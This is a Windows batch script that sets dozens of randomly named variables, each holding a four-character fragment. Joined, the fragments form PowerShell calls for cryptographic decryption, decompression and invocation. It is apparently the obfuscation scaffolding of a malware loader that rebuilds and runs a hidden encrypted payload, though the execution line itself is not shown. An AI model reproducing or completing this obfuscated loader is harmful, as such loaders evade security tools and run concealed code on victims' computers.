@echo off
set "PDRMDvnxLR=yTo("
set "QWYCUsUUrk=ewLi"
set "VTqNNNVHWl=-joi"
set "ngMYYEKIZi=rofi"
set "HqbmSyIRLw=sXyY"
set "jDDakJiISW=ptog"
set "NoUPklHApM=  $W"
set "ftkoqIRJhX=::('"
set "HhdgYnpixe=onve"
set "hiexMQJhiG='[-1"
set "HnLJGRlGhW=jWay"
set "BpUomvyTEo=)($S"
set "PZwhMyiyit=n ''"
set "GnkNANzihT=[-1."
set "uyyvrWJePS=ne);"
set "RJJXVPNroH=V = "
set "MIMkmgzsAn=B.Su"
set "iYqtGmLvFE=gsYZ"
set "NvImKMCSIq=bjec"
set "aiFrHCSPrd=, (,"
set "zKSOjPHDII=Syst"
set "LwxXunOTNI=Disp"
set "SCyadrGRit=.Con"
set "uDkfcphuQt=$SsX"
set "yGoldwAIUi=ispo"
set "xOxSYeeoQt=);$c"
set "YcqOzbEzeI=Syst"
set "RqdzCpDQVW=dd, "
set "MbQATufxnK= [st"
set "jSHqkOHmSi=ke($"
set "AKiuTBsdFH=;$aU"
set "DDgPFWYxgP=brea"
set "PqNMnKvLFK=lhjf"
set "xnsxhAZGVP=comp"
set "eSwOOaVHLy= = ["
set "RIfWbEZLkc=;$eC"
set "ReLafcaNop=();$"
set "bOCLlGUiJL=njWa"
set "HLiBpaEyZS=se()"
set "JbYGlUCkGq=stem"
set "paxwDdGzIg=ing("
set "mwTwyWjGeU=eam("
set "EXEsIgimHq=AwaS"
set "rOVCMLGcMw=hy.A"
set "HJBptQDReu=le  "
set "lSfKsOQHrX=join"
set "CnuzFpMqEy=SsXy"
set "tCtrVGPHaQ=jWay"
set "HwSPrlblXG=sXyY"
set "FWgmphKTXn=s75K"
set "dYPvRZqpwq=yste"
set "AICCVuPglz=S) {"
set "RTUwygpMzP=m.IO"
set "eNgmPsknni=Y, 0"
set "drZeDBkcXA=pher"
set "ICOQRPKOUA=3); "
set "DCsQMtXTSa=gjYA"
set "xNWWkuCqbV=stem"
set "OjsKhdTYkP=ionM"
set "CtIfwCXpEh=ecry"
set "WylccbuGvI=saBm"
set "otidgLnPkG=sion"
